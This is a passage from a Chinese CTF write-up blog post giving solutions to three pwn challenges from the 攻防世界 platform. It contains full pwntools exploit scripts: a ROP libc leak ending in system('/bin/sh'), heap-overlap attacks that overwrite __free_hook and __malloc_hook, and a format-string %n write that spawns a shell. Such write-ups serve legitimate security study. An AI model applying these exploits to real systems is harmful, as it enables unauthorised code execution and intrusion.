class="keyword">if</span> ( result != v2 )</span><br><span class="line">    sub_400BD4();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>result 的值是这么来的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_400B92</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *(*(qword_6020F0 + <span class="number">8</span>) + <span class="number">8L</span>L * (*qword_6020F0)-- - <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>翻译一下就是：</p>
<p>大小时 0x320 的堆的 bk 和第二个创建的堆的 fd 做乘法，再减去 8</p>
<p>用这个地址所指向的地址上的值作为返回值(也就是返回最后一个随机数)，然后使第二个创建的堆的 fd 自减 1</p>
<p><strong>重点二：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400E39</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(qword_6020F8 + <span class="number">8</span>);</span><br><span class="line">  v2 = (*qword_6020F8)++;</span><br><span class="line">  result = a1;</span><br><span class="line">  *(v1 + <span class="number">8</span> * v2) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是在计算两数之后选择 yes 运行的，将数值保存在大小为 0x100 的堆里，再将第一个堆的 fd 的数值自增 1</p>
<p>又因为 0x100 的堆在 0x320 的堆上面，所以我们可以靠不断存数据覆盖随机数为我们想要的数值，之后 scanf 那的 rop 就可以正常操作了</p>
<p>但是要注意，不能使用 plt_puts，got_puts 等一系列地址带 0x20 的 rop，因为 scanf 遇见空格会截断输入</p>
<p>所以这里使用 plt_printf 来进行泄露，但是这里又要注意另外一点，就是我们用来覆盖的 canary 要设置为 0，具体情况如下：</p>
<p>printf 在函数进入时有个检测，这时候我们设置的随机数是在 rax 上面的，会被 al 使用</p>
<p>比较指令，将两个数进行逻辑与运算，并根据结果设置标志寄存器</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;printf+<span class="number">7</span>&gt;      <span class="keyword">test</span>   <span class="built_in">al</span>, <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<p>跳转指令，未跳转状态</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;printf+<span class="number">34</span>&gt;    <span class="keyword">je</span>     printf+<span class="number">91</span></span><br><span class="line">&lt;printf+<span class="number">36</span>&gt;    <span class="keyword">movaps</span> xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span> + <span class="number">0x50</span>], <span class="built_in">xmm0</span></span><br></pre></td></tr></table></figure>

<p>跳转状态，此时 ZF 为 1</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;printf+<span class="number">34</span>&gt;   ✔ <span class="keyword">je</span>     printf+<span class="number">91</span></span><br><span class="line">↓</span><br><span class="line">&lt;printf+<span class="number">91</span>&gt;     <span class="keyword">lea</span>    <span class="built_in">rax</span>, [<span class="built_in">rsp</span> + <span class="number">0xe0</span>]</span><br></pre></td></tr></table></figure>

<p>众所周知，这平台的 libc 有问题，我还是用自己的好了</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./RCalc'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">53969</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./RCalc'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">plt_printf = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">got___libc_start_main = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">addr_rdi_ret = <span class="number">0x401123</span></span><br><span class="line">addr_main = <span class="number">0x401036</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x108</span></span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">pd += p64(addr_rdi_ret)</span><br><span class="line">pd += p64(got___libc_start_main)</span><br><span class="line">pd += p64(plt_printf)</span><br><span class="line">pd += p64(addr_main)</span><br><span class="line">p.sendlineafter(<span class="string">'Input your name pls: '</span>, pd)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x23</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'input 2 integer:'</span>, str(<span class="number">0</span>))</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Save the result? '</span>, <span class="string">'yes'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x401022\nc")</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">addr___libc_start_main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libcbase = addr___libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x400f8e\nc")</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x108</span></span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">pd += p64(addr_rdi_ret)</span><br><span class="line">pd += p64(addr_bin_sh)</span><br><span class="line">pd += p64(addr_system)</span><br><span class="line">p.sendlineafter(<span class="string">'Input your name pls: '</span>, pd)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x23</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'input 2 integer:'</span>, str(<span class="number">0</span>))</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Save the result? '</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'5'</span>)</span><br><span class="line">success(<span class="string">'addr___libc_start_main = '</span> + hex(addr___libc_start_main))</span><br><span class="line">success(<span class="string">'addr_system            = '</span> + hex(addr_system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-17"><a href="#Flag-17" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="Description-18"><a href="#Description-18" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-18"><a href="#Solution-18" class="headerlink" title="Solution:"></a>Solution:</h3><p>注意 tcachebin 的最大数值是 0x410，再大分配的就是 unsortedbin</p>
<p>用 unsortedbin 完成 overlap chunk 的创建，泄露出 libc 基地址</p>
<p>然后修改 __free_hook 为 addr_system，之后释放一个<code>/bin/sh</code>堆块即可提权</p>
<p>平台是 Ubuntu 16.04，libc 是 2.23 的，题目是 Ubuntu 18.04，libc 是 2.27 的，我服了</p>
<p>Ubuntu 16.04 的题解需要用 __libc_realloc 调整一下堆栈</p>
<p>one_gadget 放在 __realloc_hook，__libc_realloc 放在 __malloc_hook</p>
<p><strong>平台exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./timu'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)  <span class="comment"># Ubuntu 16.04</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">34925</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./timu'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(create_size, create_data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: \n'</span>, str(create_size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Data: '</span>, create_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: \n'</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x508</span>, <span class="string">'A'</span> * <span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">'a'</span> * <span class="number">0x418</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x488</span>, <span class="string">''</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">''</span>)  <span class="comment"># 4</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x488</span>, <span class="string">''</span>)  <span class="comment"># 1</span></span><br><span class="line">p.sendafter(<span class="string">'Your choice :\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'4 : '</span>)</span><br><span class="line"></span><br><span class="line">addr___malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x68</span></span><br><span class="line">libcbase = addr___malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">addr___libc_realloc = libcbase + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">libc_one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">addr_one_gadget = libcbase + libc_one_gadget[<span class="number">1</span>]</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">''</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">''</span>)  <span class="comment"># 5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x68</span>, p64(addr___malloc_hook - <span class="number">0x23</span>))  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x68</span>, p64(addr___malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x68</span>, p64(addr___malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">'\x00'</span> * <span class="number">0xb</span> + p64(addr_one_gadget) + p64(addr___libc_realloc))</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Size: \n'</span>, <span class="string">''</span>)</span><br><span class="line">success(<span class="string">'addr___malloc_hook = '</span> + hex(addr___malloc_hook))</span><br><span class="line">success(<span class="string">'addr_one_gadget    = '</span> + hex(addr_one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0xABD)\nc")</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>原本exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./timu'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)  <span class="comment"># Ubuntu 18.04</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">34925</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./timu'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(create_size, create_data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: \n'</span>, str(create_size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Data: '</span>, create_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: \n'</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x508</span>, <span class="string">'A'</span> * <span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">'a'</span> * <span class="number">0x418</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0xd8</span>, <span class="string">''</span>)  <span class="comment"># 4</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x418</span>, <span class="string">''</span>)  <span class="comment"># 1</span></span><br><span class="line">p.sendafter(<span class="string">'Your choice :\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'4 : '</span>)</span><br><span class="line"></span><br><span class="line">addr___malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x70</span></span><br><span class="line">libcbase = addr___malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">addr___free_hook = libcbase + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">create(<span class="number">0xd8</span>, <span class="string">''</span>)  <span class="comment"># 2</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xd8</span>, p64(addr___free_hook))  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0xd8</span>, <span class="string">'/bin/sh\x00'</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0xd8</span>, p64(addr_system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">success(<span class="string">'addr___malloc_hook = '</span> + hex(addr___malloc_hook))</span><br><span class="line">success(<span class="string">'addr___free_hook   = '</span> + hex(addr___free_hook))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-18"><a href="#Flag-18" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><h3 id="Description-19"><a href="#Description-19" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆。</p>
</blockquote>
<hr>
<h3 id="Solution-19"><a href="#Solution-19" class="headerlink" title="Solution:"></a>Solution:</h3><p>送分题，直接修改 key 值，超暴力方法</p>
<p>主程序如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">locker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-208h]</span></span><br><span class="line"></span><br><span class="line">  fgets(&amp;s, <span class="number">0x200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  imagemagic(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0x2223322</span> )</span><br><span class="line">    result = system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">52406</span>)</span><br><span class="line">addr_key = <span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x080484A7\nc\nsi")</span></span><br><span class="line">pd = p32(addr_key)</span><br><span class="line">pd += <span class="string">'%35795742d'</span></span><br><span class="line">pd += <span class="string">'%12$n'</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-19"><a href="#Flag-19" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="">【WriteUp】攻防世界--Pwn题解(Part 2)</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">binLep</a></p>
        <p><span>发布时间:</span>2019-12-12, 19:27:00</p>
        <p><span>最后更新:</span>2019-12-25, 00:02:03</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="" title="【WriteUp】攻防世界--Pwn题解(Part 2)">http://binlep.github.io/2019/12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/</a>
            <span class="copy-path" data-clipboard-text="原文: http://binlep.github.io/2019/12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/　　作者: binLep" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="../../16/【Pwn 笔记】格式化字符串总结/">
                    【Pwn 笔记】格式化字符串总结
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="../../../11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/">
                    【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
